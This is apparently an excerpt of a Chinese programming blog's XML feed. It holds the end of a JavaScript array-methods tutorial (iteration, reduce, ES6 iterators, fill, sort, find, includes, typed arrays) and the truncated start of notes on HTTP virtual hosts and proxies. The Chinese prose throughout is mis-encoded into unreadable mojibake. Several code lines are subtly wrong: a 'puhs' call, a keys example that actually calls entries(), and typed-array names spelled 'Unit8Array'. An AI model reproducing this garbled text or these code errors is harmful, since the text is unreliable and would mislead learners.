å¦‚æžœæ˜¯ 2çš„å€æ•°ï¼Œå°±è¿”å›ž true return (x % 2 == 0);&#125;var number = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]; everyevery ä¼šè¿­ä»£æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œç›´åˆ°è¿”å›ž falseã€‚ 1number.every(isEven) åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ•°ç»„numberç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯1ï¼Œä¸æ˜¯2çš„å€æ•°ï¼Œå› æ­¤ isEven å‡½æ•°è¿”å›žfalse,ç„¶åŽ every æ‰§è¡Œç»“æŸã€‚ somesome æ–¹æ³•å’Œ every ç›¸ä¼¼ï¼Œä¸è¿‡someæ–¹æ³•ä¼šè¿­ä»£æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œç›´åˆ°å‡½æ•°è¿”å›žtrue 1number.some(isEven) è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ•°ç»„çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯2ï¼Œä¸º2çš„å€æ•°ï¼Œå› æ­¤è¿”å›žtrueï¼Œè¿­ä»£ç»“æŸ forEachå¦‚æžœè¦è¿­ä»£æ•´ä¸ªæ•°ç»„å¯ä»¥ç”¨ forEach æ–¹æ³•ï¼Œå’Œä½¿ç”¨ for å¾ªçŽ¯ç›¸åŒï¼š 123number.forEach(function(x)&#123; console.log((x % 2 == 0));&#125;); map &amp; filterJavaScriptè¿˜æœ‰ä¸¤ä¸ªä¼šè¿”å›žæ–°æ•°ç»„çš„éåŽ†æ–¹æ³•ã€‚ç¬¬ä¸€ä¸ªæ˜¯ mapï¼š 12var myMap = number.map(isEven);myMap // [false, true, false, true, false, true, false, true, false, true, false, true, false, true, false] ä»Žä¸Šé¢ä»£ç å¯ä»¥çœ‹å‡ºï¼ŒmyMapä¿å­˜äº†ä¼ å…¥ map æ–¹æ³•çš„ isEvenå‡½æ•°è¿è¡Œçš„ç»“æžœã€‚è¿™æ ·å°±å¯ä»¥å¾ˆå®¹æ˜“çŸ¥é“ä¸€ä¸ªå…ƒç´ æ˜¯å¦å¶æ•°ã€‚ è¿˜æœ‰ä¸€ä¸ªfilteræ–¹æ³•ï¼Œå®ƒè¿”å›žçš„æ–°æ•°ç»„ç”±ä½¿å‡½æ•°è¿”å›ž true çš„å…ƒç´ ç»„æˆï¼š 12var evenNumbers = number.filter(isEven);evenNumbers // [2, 4, 6, 8, 10, 12, 14] reducereduce() æ–¹æ³•æŽ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºç´¯åŠ å™¨ï¼Œæ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ï¼ˆä»Žå·¦åˆ°å³ï¼‰å¼€å§‹ç¼©å‡ï¼Œæœ€ç»ˆè®¡ç®—ä¸ºä¸€ä¸ªå€¼ã€‚ è¯­æ³• 1array.reduce(function(total, currentValue, currentIndex, arr), initialValue) å‚æ•° æè¿° total å¿…éœ€ã€‚åˆå§‹å€¼, æˆ–è€…è®¡ç®—ç»“æŸåŽçš„è¿”å›žå€¼ã€‚ currentValue å¿…éœ€ã€‚å½“å‰å…ƒç´  currentIndex å¯é€‰ã€‚å½“å‰å…ƒç´ çš„ç´¢å¼• arr å¯é€‰ã€‚å½“å‰å…ƒç´ æ‰€å±žçš„æ•°ç»„å¯¹è±¡ã€‚ å¦‚æžœè¦å¯¹ä¸€ä¸ªæ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ è¿›è¡Œæ±‚å’Œï¼Œè¿™å°±å¾ˆæœ‰ç”¨ 1234number.reduce(function(total,currentValue,index)&#123; return total + currentValue;&#125;);// 120 ES6 å’Œæ•°ç»„çš„æ–°åŠŸèƒ½ä¸‹è¡¨æ˜¯ES6/7æ–°å¢žçš„æ•°ç»„æ–¹æ³• æ–¹æ³• æè¿° @@iterator è¿”å›žä¸€ä¸ªåŒ…å«æ•°ç»„é”®å€¼å¯¹çš„è¿­ä»£å™¨å¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡åŒæ­¥è°ƒç”¨å¾—åˆ°æ•°ç»„å…ƒç´ çš„é”®å€¼å¯¹ copyWithin å¤åˆ¶æ•°ç»„ä¸­ä¸€ç³»åˆ—å…ƒç´ åˆ°åŒä¸€æ•°ç»„æŒ‡å®šçš„èµ·å§‹ä½ç½® entries è¿”å›žåŒ…å«æ•°ç»„æ‰€æœ‰é”®å€¼å¯¹çš„@@iterator includes å¦‚æžœæ•°ç»„ä¸­å­˜åœ¨æŸä¸ªå…ƒç´ åˆ™è¿”å›ž true,å¦åˆ™è¿”å›žfalse,ES7æ–°å¢ž find æ ¹æ®å›žè°ƒå‡½æ•°ç»™å®šçš„æ¡ä»¶ä»Žæ•°ç»„ä¸­æŸ¥æ‰¾å…ƒç´ ï¼Œå¦‚æžœæ‰¾åˆ°å°±è¿”å›žè¯¥å…ƒç´  findIndex æ ¹æ®å›žè°ƒå‡½æ•°ç»™å®šçš„æ¡ä»¶ä»Žæ•°ç»„ä¸­å¯»æ‰¾å…ƒç´ ï¼Œå¦‚æžœæ‰¾åˆ°å°±è¿”å›žè¯¥å…ƒç´ åœ¨æ•°ç»„ä¸­çš„ç´¢å¼• fill ç”¨é™æ€å€¼å¡«å……æ•°ç»„ from æ ¹æ®å·²æœ‰æ•°ç»„åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ keys è¿”å›žåŒ…å«æ•°ç»„æ‰€æœ‰ç´¢å¼•çš„@@iterator of æ ¹æ®ä¼ å…¥çš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ values è¿”å›žåŒ…å«æ•°ç»„ä¸­æ‰€æœ‰å€¼çš„@@iterator é™¤äº†è¿™äº›æ–°çš„æ–¹æ³•ï¼Œè¿˜æœ‰ä¸€ç§ç”¨ forâ€¦ ofå¾ªçŽ¯æ¥è¿­ä»£æ•°ç»„çš„æ–°åšæ³•ï¼Œä»¥åŠå¯ä»¥ä»Žæ•°ç»„å®žä¾‹å¾—åˆ°çš„è¿­ä»£å™¨å¯¹è±¡ã€‚ ä½¿ç”¨ forEach å’Œç®­å¤´å‡½æ•°ç®­å¤´å‡½æ•°å¯ä»¥ç®€åŒ–ä½¿ç”¨ forEachè¿­ä»£æ•°ç»„å…ƒç´ çš„åšæ³• 1234567number.forEach(function(x)&#123; console.log (x % 2 == 0);&#125;)// ç­‰äºŽnumber.forEach(x =&gt; &#123; console.log(x % 2 == 0);&#125;); ä½¿ç”¨ forâ€¦of å¾ªçŽ¯è¿­ä»£123for(let n of number)&#123; console.log(n % 2 == 0);&#125; ä½¿ç”¨ES6æ–°çš„è¿­ä»£å™¨ï¼ˆ@@iteratorï¼‰ES6è¿˜ä¸º Array ç±»å¢žåŠ äº†ä¸€ä¸ª @@iterator å±žæ€§ï¼Œéœ€è¦é€šè¿‡ Symbol.iteratoræ¥è®¿é—®ã€‚ 1234567let iterator = number[Symbol.iterator]();console.log(iterator.next().value); // 1console.log(iterator.next().value); // 2console.log(iterator.next().value); // 3console.log(iterator.next().value); // 4console.log(iterator.next().value); // 5console.log(iterator.next().value); // 6 å› ä¸ºnumberæ•°ç»„ä¸­æœ‰15ä¸ªå€¼ï¼Œæ‰€ä»¥éœ€è¦è°ƒç”¨15æ¬¡ iterator.next().value ï¼Œæ•°ç»„ä¸­æ‰€æœ‰å€¼éƒ½è¿­ä»£å®Œä¹‹åŽï¼Œå°±ä¼šè¿”å›ž undefinedã€‚ æ•°ç»„çš„ entriesã€keys å’Œ values æ–¹æ³• ES6è¿˜å¢žåŠ äº†ä¸‰ç§ä»Žæ•°ç»„ä¸­å¾—åˆ°è¿­ä»£å™¨çš„æ–¹æ³•ã€‚ entries æ–¹æ³•è¿”å›žåŒ…å«é”®å€¼å¯¹çš„ @@iterator 1234let aEntries = number.entries(); // å¾—åˆ°é”®å€¼å¯¹çš„è¿­ä»£å™¨console.log(aEntries.next().value); // [0,1] -- ä½ç½®0çš„å€¼ä¸º1console.log(aEntries.next().value); // [1,2] -- ä½ç½®1çš„å€¼ä¸º2console.log(aEntries.next().value); // [2,3] -- ä½ç½®2çš„å€¼ä¸º3 number æ•°ç»„ä¸­éƒ½æ˜¯æ•°å­—ï¼Œkeyæ˜¯æ•°ç»„ä¸­çš„ä½ç½®ï¼Œvalueæ˜¯ä¿å­˜åœ¨æ•°ç»„ä¸­ç´¢å¼•çš„å€¼ ä½¿ç”¨é›†åˆã€å­—æ®µã€æ•£åˆ—è¡¨ç­‰æ•°æ®ç»“æž„æ—¶ï¼Œèƒ½å¤Ÿå–å‡ºé”®å€¼å¯¹æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚åŽé¢ä¼šè¯¦ç»†è®²è§£ã€‚ key æ–¹æ³•è¿”å›žåŒ…å«æ•°ç»„ç´¢å¼•çš„ @@iterator 1234let aKeys = number.entries(); // å¾—åˆ°æ•°ç»„ç´¢å¼•çš„è¿­ä»£å™¨console.log(aKeys.next()); // &#123; valueï¼š 0ï¼Œ done: false&#125;console.log(aKeys.next()); // &#123; valueï¼š 1ï¼Œ done: false&#125;console.log(aKeys.next()); // &#123; valueï¼š 2ï¼Œ done: false&#125; keysæ–¹æ³•ä¼šè¿”å›žnumberæ•°ç»„çš„ç´¢å¼•ã€‚ä¸€æ—¦æ²¡æœ‰å¯ä»¥è¿­ä»£çš„å€¼ï¼ŒaKeys.next() å°±ä¼šè¿”å›žä¸€ä¸ªvalueå±žæ€§ä¸ºundefinedï¼Œdoneå±žæ€§ä¸º trueçš„å¯¹è±¡ã€‚å¦‚æžœ doneå±žæ€§ä¸ºfalseï¼Œå°±æ„å‘³ç€è¿˜æœ‰å¯ä»¥è¿­ä»£çš„å€¼ã€‚ ä½¿ç”¨fromæ–¹æ³•Array.fromæ–¹æ³•æ ¹æ®å·²æœ‰çš„æ•°ç»„åˆ›å»ºä¸€ä¸ªæ–°æ•°ã€‚æ¯”å¦‚å¤åˆ¶numberæ•°ç»„ï¼š 12let number2 = Array.from(number);number2 // [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15] ä½¿ç”¨Array.ofArrayæ ¹æ®ä¼ å…¥çš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ã€ 1234567let number3 = Array.of(1);let number4 = Array.of(1,2,3,4,5,6);number3 // [1]number4 // [1,2,3,4,5,6]// å¤åˆ¶å·²æœ‰çš„æ•°ç»„let numberCopy = Array.of(...number4);numberCopy // [1,2,3,4,5,6] ä½¿ç”¨fillæ–¹æ³•fillæ–¹æ³•ç”¨é™æ€å€¼å……å¡«æ•°ç»„ã€‚ 123456let numberCopy = Array.of(1,2,3,4,5,6);numberCopy.fill(0); // [0, 0, 0, 0, 0, 0]// æŒ‡å®šå¼€å§‹å……å¡«çš„ç´¢å¼•numberCopy.fill(2,1); // [0, 2, 2, 2, 2, 2]// æŒ‡å®šç»“æŸçš„ç´¢å¼•(ç»“æŸçš„ç´¢å¼•ä¸åŒ…æ‹¬æœ¬èº«)numberCopy.fill(1,3,5); // [0, 2, 2, 1, 1, 2] åˆ›å»ºæ•°ç»„å¹¶åˆå§‹åŒ–çš„æ—¶å€™ï¼Œfill æ–¹æ³•å°±éžå¸¸å¥½ç”¨ã€‚ 1let ones = Array(6).fill(1); // åˆ›å»ºäº†ä¸€ä¸ªé•¿åº¦ä¸º6ï¼Œæ‰€æœ‰å€¼éƒ½æ˜¯1çš„æ•°ç»„ ä½¿ç”¨copyWithinæ–¹æ³•copyWithinæ–¹æ³•å¤åˆ¶æ•°ç»„ä¸­çš„ä¸€ç³»åˆ—å…ƒç´ åˆ°åŒä¸€ä¸ªæ•°ç»„æŒ‡å®šçš„èµ·å§‹ä½ç½®ã€‚ è¯­æ³•ï¼š 1array.copyWithin(target, start, end) å‚æ•° æè¿° target å¿…éœ€ã€‚å¤åˆ¶åˆ°æŒ‡å®šç›®æ ‡ç´¢å¼•ä½ç½®ã€‚ start å¯é€‰ã€‚å…ƒç´ å¤åˆ¶çš„èµ·å§‹ä½ç½®ã€‚ end å¯é€‰ã€‚åœæ­¢å¤åˆ¶çš„ç´¢å¼•ä½ç½® (é»˜è®¤ä¸º array.length)ã€‚å¦‚æžœä¸ºè´Ÿå€¼ï¼Œè¡¨ç¤ºå€’æ•°ã€‚ 12345let copyArray = [1,2,3,4,5,6];copyArray.copyWithin(0,3); // [4, 5, 6, 4, 5, 6]let copyArray1 = [1,2,3,4,5,6];copyArray1.copyWithin(1,3,5); // [1, 4, 5, 4, 5, 6] æŽ’åºå…ƒç´ ååºè¾“å‡ºæœ€å¼€å§‹çš„é•¿åº¦ä¸º15çš„numberæ•°ç»„ã€‚ 12number.reverse();// [15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1] å°è¯•ä½¿ç”¨JavaScriptè‡ªå¸¦çš„æŽ’åºå‡½æ•° sort(); 12number.sort();//[1, 10, 11, 12, 13, 14, 15, 2, 3, 4, 5, 6, 7, 8, 9] è·Ÿæˆ‘ä»¬é¢„æœŸçš„æœ‰äº›ä¸ä¸€æ ·ï¼Œè¿™æ˜¯å› ä¸º sort æ–¹æ³•åœ¨å¯¹æ•°ç»„è¿›è¡ŒæŽ’åº çš„æ—¶å€™ï¼ŒæŠŠå…ƒç´ é»˜è®¤æˆå­—ç¬¦ä¸²è¿›è¡Œç›¸äº’æ¯”è¾ƒã€‚æ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±å®šä¹‰ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ã€‚ 1234number.sort((a,b) =&gt;&#123; return a -b;&#125;)// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15] ä¸Šè¿°ä»£ç ï¼Œå¦‚æžœ b å¤§äºŽ aï¼Œä¼šè¿”å›žè´Ÿæ•°ï¼Œåä¹‹å°±æ˜¯æ­£æ•°ã€‚å¦‚æžœç›¸ç­‰çš„è¯ï¼Œå°±ä¼šè¿”å›ž0ã€‚ä¸‹é¢çš„å†™æ³•ä¼šæ¸…æ™°ä¸€ç‚¹ 12345678910function compare(a, b)&#123; if(a &lt; b)&#123; return -1; &#125; if(a &gt; b)&#123; return 1; &#125; return 0;&#125;number.sort(compare); sort æ–¹æ³•æŽ¥å— compareFunctionä½œä¸ºå‚æ•°æ¥æ¯”è¾ƒå…ƒç´ ã€‚ç„¶åŽsort ä¼šç”¨å®ƒæ¥æŽ’åºæ•°ç»„ è‡ªå®šä¹‰æŽ’åºæˆ‘ä»¬å¯ä»¥å¯¹ä»»ä½•å¯¹è±¡ç±»åž‹çš„æ•°ç»„æŽ’åºï¼Œä¹Ÿå¯ä»¥åˆ›å»º compareFuntion æ¥æ¯”è¾ƒå…ƒç´ ã€‚ä¾‹å¦‚å¯¹è±¡ Person æœ‰åå­—å’Œå±žæ€§ï¼Œæˆ‘ä»¬å¸Œæœ›æ ¹æ®å¹´é¾„æŽ’åºã€‚ 123456789101112var friends = [ &#123;name: 'John', age: 30&#125;, &#123;name: 'Ana', age: 20&#125;, &#123;name: 'Chris', age: 25&#125;];friends.sort((a, b) =&gt;&#123; return a.age - b.age;&#125;)// &#123;name: "Ana", age: 20&#125; &#123;name: "Chris", age: 25&#125; &#123;name: "John", age: 30&#125; å­—ç¬¦ä¸²æŽ’åº 123var names = ['Ana', 'ana', 'John', 'john'];names.sort();// ["Ana", "John", "ana", "john"] å­—ç¬¦ä¸²çš„æ¯”è¾ƒæ˜¯æ ¹æ®å¯¹åº”çš„ ASCâ…¡å€¼æ¥æ¯”è¾ƒçš„ã€‚ä¾‹å¦‚ Aã€Jã€aã€jå¯¹åº”åˆ†åˆ«æ˜¯65ã€74ã€97ã€106ã€‚ è™½ç„¶å­—æ¯è¡¨çš„ a æ˜¯æŽ’é å‰çš„ï¼Œä½†æ˜¯ç”±äºŽ ASCâ…¡å€¼ æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥æ²¡æœ‰æŽ’åœ¨é¦–ä½ã€‚å¦‚æžœå¿½ç•¥å¤§å°å†™å‘¢ï¼Ÿä¼šæ˜¯æ€Žä¹ˆæ · 12345678910names.sort((a, b) =&gt;&#123; if(a.toLowerCase() &lt; b.toLowerCase())&#123; return -1; &#125; if(a.toLowerCase() &gt; b.toLowerCase())&#123; return 1; &#125; return 0; &#125;)// ["Ana", "ana", "John", "john"] æœç´¢æœç´¢æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼šindexOfæ–¹æ³•è¿”å›žä¸Žå‚æ•°åŒ¹é…çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•ï¼ŒlastIndexOfè¿”å›žä¸Žå‚æ•°åŒ¹é…çš„æœ€åŽä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•ã€‚ 123456number.indexOf(10); // 9number.indexOf(100); // -1 ï¼ˆå› ä¸º100ä¸å­˜åœ¨æ•°ç»„é‡Œé¢ï¼‰number.puhs(10);number.lastIndexOf(10); // 15number.lastIndexOf(100) // -1 ES6 find å’Œ findIndexæ–¹æ³•123456let number = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15];const multipleof13 = (element, index, array) =&gt; &#123; return (element % 13 == 0);&#125;number.find(multipleof13); //13number.findIndex(multipleof13); // 12 find å’Œ findIndexæ–¹æ³•æŽ¥å—ä¸€ä¸ªå›žè°ƒå‡½æ•°ï¼Œæœç´¢ä¸€ä¸ªæ»¡è¶³å›žè°ƒå‡½æ•°æ¡ä»¶çš„å€¼ã€‚ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬è¦ä»Žæ•°ç»„é‡Œæ‰¾æœ‰ä¸ª13çš„å€æ•°ã€‚ ES7 ä½¿ç”¨includesæ–¹æ³•å¦‚æžœæ•°ç»„å­˜åœ¨æŸä¸ªå…ƒç´ ï¼Œincludes æ–¹æ³•å°±ä¼šè¿”å›ž true,å¦åˆ™å°±è¿”å›ž falseã€‚ 1234number.includes(15) // truenumber.includes(20) // falsenumber.includes(4,4) // false ç¬¬äºŒä¸ªå‚æ•°ä¸ºå¼€å§‹æœç´¢çš„ç´¢å¼• è¾“å‡ºå­—ç¬¦ä¸²toString å’Œ jion æ–¹æ³• å¦‚æžœæƒ³æŠŠæ•°ç»„é‡Œæ‰€æœ‰å…ƒç´ è¾“å‡ºä½ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨ toString æ–¹æ³• 1number.toString(); // "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15" è¿˜å¯ä»¥ç”¨ä¸åŒçš„åˆ†éš”ç¬¦å°†å…ƒç´ éš”å¼€ 1number.join(&apos;-&apos;); // &quot;1-2-3-4-5-6-7-8-9-10-11-12-13-14-15&quot; ç±»åž‹æ•°ç»„JavaScriptç”±äºŽä¸æ˜¯å¼ºç±»åž‹çš„ï¼Œå› æ­¤å¯ä»¥å­˜å‚¨ä»»æ„ç±»åž‹çš„æ•°æ®ï¼Œè€Œç±»åž‹æ•°ç»„åˆ™ç”¨äºŽå­˜å‚¨å•ä¸€çš„æ•°æ®ã€‚ è¯­æ³•ï¼š 1let myArray = new TypedArray(length); ç±»åž‹æ•°ç»„ æ•°æ®ç±»åž‹ Int8Array 8ä½äºŒè¿›åˆ¶è¡¥ç æ•´æ•° Unit8Array 8ä½æ— ç¬¦å·æ•´æ•° Unit8ClampedArray 8ä½æ— ç¬¦å·æ•´æ•° Int16Array 16ä½äºŒè¿›åˆ¶è¡¥ç æ•´æ•° Unit16Array 16ä½æ— ç¬¦å·æ•´æ•° Int32Array 32ä½äºŒè¿›åˆ¶è¡¥ç æ•´æ•° Unit32Array 32ä½æ— ç¬¦å·æ•´æ•° Float32Array 32ä½IEEEæµ®ç‚¹æ•° Float64Array 64ä½IEEEæµ®ç‚¹æ•° 12345678910let length = 5;let int16 = new Int16Array(length);let array16 = [];array16.length = length;for(let i = 0;i &lt; length; i++)&#123; int16[i] = i + 1;&#125;console.log(int16); // [1, 2, 3, 4, 5] ä½¿ç”¨ webGl APIã€è¿›è¡Œä½æ“ä½œã€å¤„ç†æ–‡ä»¶å’Œå›¾åƒæ—¶å€™ï¼Œç±»åž‹æ•°ç»„éƒ½å¯ä»¥å¤§å±•æ‹³è„šã€‚å®ƒç”¨èµ·æ¥å’Œæ™®é€šæ•°ç»„ä¹Ÿæ¯«æ— äºŒè‡´ï¼Œæœ¬èŠ‚æ‰€å­¦çš„æ•°ç»„æ–¹æ³•å’ŒåŠŸèƒ½éƒ½å¯ä»¥ç”¨äºŽç±»åž‹æ•°ç»„ã€‚ å°ç»“å­¦ä¹ äº†å¸¸è§çš„æ•°æ®ç»“æž„ï¼šæ•°ç»„ã€‚å­¦ä¹ äº†æ€Žä¹ˆå£°æ˜Žå’Œåˆå§‹åŒ–æ•°ç»„ï¼Œç»™æ•°ç»„èµ‹å€¼åŽï¼Œä»¥åŠæ·»åŠ å’Œç§»é™¤æ•°ç»„å…ƒç´ ï¼Œå­¦äº†å¤šç»´æ•°ç»„å’Œæ•°ç»„çš„ä¸€äº›æ“ä½œæ–¹æ³•ã€‚ ä¸‹ä¸€ç« ï¼Œå­¦ä¹ æ ˆï¼Œä¸€ç§å…·æœ‰ç‰¹æ®Šè¡Œä¸ºçš„æ•°ç»„ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬äº”ç« ï¼‰â€”â€” HTTP åä½œçš„ Web æœåŠ¡å™¨]]></title>
    <url>%2F2018-08-15-read-%E5%9B%BE%E8%A7%A3HTTP-Part5.html</url>
    <content type="text"><![CDATA[ç¬¬äº”ç«  ä¸Ž HTTP åä½œçš„ Web æœåŠ¡å™¨ç”¨å•å°è™šæ‹Ÿä¸»æœºå®žçŽ°å¤šä¸ªåŸŸåHTTP/1.1 è§„èŒƒè¿è¡Œä¸€å°HTTPæœåŠ¡å™¨æ­å»ºå¤šä¸ª Web ç«™ç‚¹ã€‚æ¯”å¦‚ï¼Œæä¾› Web æ‰˜ç®¡æœåŠ¡ ï¼ˆWeb Hosting Serverï¼‰çš„ä¾›åº”å•†ï¼Œå¯ä»¥ç”¨ä¸€å°æœåŠ¡å™¨ä¸ºå¤šä¸ºå®¢æˆ·æœåŠ¡ï¼Œä¹Ÿå¯ä»¥ä»¥æ¯ä½å®¢æˆ·æŒæœ‰çš„åŸŸåè¿è¡Œå„è‡ªä¸åŒåˆ†ç½‘ç«™ã€‚è¿™æ˜¯å› ä¸ºåˆ©ç”¨äº†è™šæ‹Ÿä¸»æœºï¼ˆVirtual Hostï¼Œåˆç§°ä¸ºè™šæ‹ŸæœåŠ¡å™¨ï¼‰çš„åŠŸèƒ½ã€‚ å³ä½¿ç‰©ç†å±‚é¢åªæœ‰ä¸€å°æœåŠ¡å™¨ï¼Œä½†åªè¦ä½¿ç”¨è™šæ‹Ÿä¸»æœºçš„åŠŸèƒ½ï¼Œåˆ™å¯ä»¥å‡æƒ³å·²æœ‰å¤šå°æœåŠ¡å™¨ã€‚ å®¢æˆ·ç«¯ä½¿ç”¨HTTPåè®®è®¿é—®æœåŠ¡å™¨æ—¶ï¼Œå°±ä¼šç»å¸¸é‡‡ç”¨ç±»ä¼¼ www.xxx.xxx çš„è¿™æ ·çš„ä¸»æœºåå’ŒåŸŸåã€‚ åœ¨äº’è”ç½‘ä¸Šï¼ŒåŸŸåé€šè¿‡ DNS æœåŠ¡æ˜ å°„åˆ° IP åœ°å€ï¼ˆåŸŸåè§£æžï¼‰ä¹‹åŽè®¿é—®ç›®æ ‡ç½‘ç«™ã€‚å¯è§ï¼Œå½“è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨æ—¶ï¼Œå·²ç»æ˜¯ä»¥ IP çš„åœ°å€å½¢å¼è®¿é—®äº†ã€‚ æ‰€ä»¥ï¼Œå¦‚æžœä¸€å°æœåŠ¡å™¨å†…æ‰˜ç®¡äº† www.a.com å’Œ www.b.com è¿™ä¸¤ä¸ªåŸŸåï¼Œé‚£ä¹ˆå½“æ”¶åˆ°è¯·æ±‚çš„æ—¶å€™å°±è¦æ¸…æ¥šç©¶ç«Ÿæ˜¯è¦è®¿é—®å“ªä¸ªåŸŸåï¼Œå› ä¸ºå®ƒä»¬åŒæ—¶éƒ¨ç½²åœ¨åŒä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œä¼šæœ‰ç›¸åŒçš„ IP åœ°å€ã€‚ä½¿ç”¨ DNS æœåŠ¡è§£æžåŸŸååŽï¼Œä¸¤è€…çš„è®¿é—® IP åœ°å€ä¼šç›¸åŒã€‚ æ‰€ä»¥åœ¨ç›¸åŒçš„ IP åœ°å€ä¸‹ï¼Œç”±äºŽè™šæ‹Ÿä¸»æœºå¯ä»¥å¯„å­˜å¤šä¸ªä¸åŒçš„ä¸»æœºååå’ŒåŸŸåçš„ Web ç½‘ç«™ï¼Œå› æ­¤åœ¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œå¿…é¡»åœ¨ HOST é¦–éƒ¨å†…å®Œæ•´æŒ‡å®šä¸»æœºåæˆ–è€…æ˜¯åŸŸåçš„ URI ã€‚ é€šä¿¡æ•°æ®è½¬å‘ç¨‹åºï¼šä»£ç†ã€ç½‘å…³ã€éš§é“HTTP é€šä¿¡æ—¶ï¼Œé™¤å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€äº›ç”¨äºŽé€šä¿¡æ•°æ®è½¬å‘çš„åº”ç”¨ç¨‹åºï¼Œä¾‹å¦‚ä»£ç†ã€ç½‘å…³å’Œéš§é“ã€‚å®ƒä»¬å¯ä»¥é…åˆæœåŠ¡å™¨å·¥ä½œã€‚ è¿™äº›åº”ç”¨ç¨‹åºå’ŒæœåŠ¡å™¨å¯ä»¥å°†è¯·æ±‚è½¬å‘ç»™é€šä¿¡çº¿ä¸Šçš„ä¸‹ä¸€ç«™æœåŠ¡å™¨ï¼Œå¹¶ä¸”å¯ä»¥æŽ¥å—ä»Žé‚£å°æœåŠ¡å™¨å‘é€çš„å“åº”å†è½¬å‘å®¢æˆ·ç«¯ã€‚ é€šä¿¡æ•°æ®è½¬å‘ç¨‹åº æè¿° ä»£ç† ä»£ç†æ˜¯ä¸€ç§æœ‰è½¬å‘åŠŸèƒ½çš„åº”ç”¨ç¨‹åºï¼Œå®ƒæ‰®æ¼”äº†ä½äºŽæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯â€œä¸­é—´äººâ€çš„è§’è‰²ï¼ŒæŽ¥æ”¶ç”±å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚å¹¶è½¬å‘ç»™æœåŠ¡å™¨ï¼ŒåŒæ—¶ä¹ŸæŽ¥å—æœåŠ¡å™¨è¿”å›žçš„å“åº”å¹¶è½¬å‘ç»™å®¢æˆ·ç«¯ã€‚ ç½‘å…³ ç½‘å…³æ˜¯è½¬å‘å…¶ä»–æœåŠ¡å™¨é€šä¿¡æ•°æ®çš„æœåŠ¡å™¨ï¼ŒæŽ¥æ”¶ä»Žå®¢æˆ·ç«¯å‘é€æ¥çš„è¯·æ±‚æ—¶ï¼ŒåŒæ—¶ä¹ŸæŽ¥æ”¶æœåŠ¡å™¨è¿”å›žçš„å“åº”å¹¶è½¬å‘ç»™å®¢æˆ·ç«¯ã€‚ éš§é“ éš§é“æ˜¯åœ¨ç›¸éš”ç”šè¿œçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸¤è€…ä¹‹é—´è¿›è¡Œä¸­è½¬ï¼Œå¹¶ä¿æŒåŒæ–¹é€šä¿¡è¿žæŽ¥çš„åº”ç”¨ç¨‹åºã€‚ ä»£ç† ä»£ç†æœåŠ¡å™¨çš„åŸºæœ¬è¡Œä¸ºå°±æ˜¯æŽ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚åŽè½¬å‘ç»™å…¶ä»–æœåŠ¡å™¨ã€‚ä»£ç†ä¸æ”¹å˜è¯·æ±‚çš„ URI ï¼Œä¼šç›´æŽ¥å‘é€ç»™å‰æ–¹æŒæœ‰èµ„æºçš„ç›®çš„æœåŠ¡å™¨ã€‚ æŒæœ‰èµ„æºå®žä½“çš„æœåŠ¡å™¨è¢«ç§°ä¸ºæºæœåŠ¡å™¨ã€‚ä»ŽæºæœåŠ¡å™¨è¿”å›žçš„å“åº”ç»è¿‡ä»£ç†æœåŠ¡å™¨åŽå†ä¼ å›žå®¢æˆ·ç«¯ã€‚ å›¾ï¼šæ¯æ¬¡ä»£ç†æœåŠ¡å™¨è½¬å‘è¯·æ±‚æˆ–è€…å“åº”æ—¶ï¼Œä¼šè¿½åŠ å†™å…¥ Via é¦–éƒ¨æ¶ˆæ¯ åœ¨ HTTP é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œå¯çº§è”å¤šå°ä»£ç†æœåŠ¡å™¨ã€‚è¯·æ±‚å’Œå“åº”çš„è½¬å‘ä¼šç»è¿‡æ•°å°ç±»ä¼¼é”é“¾ä¸€æ 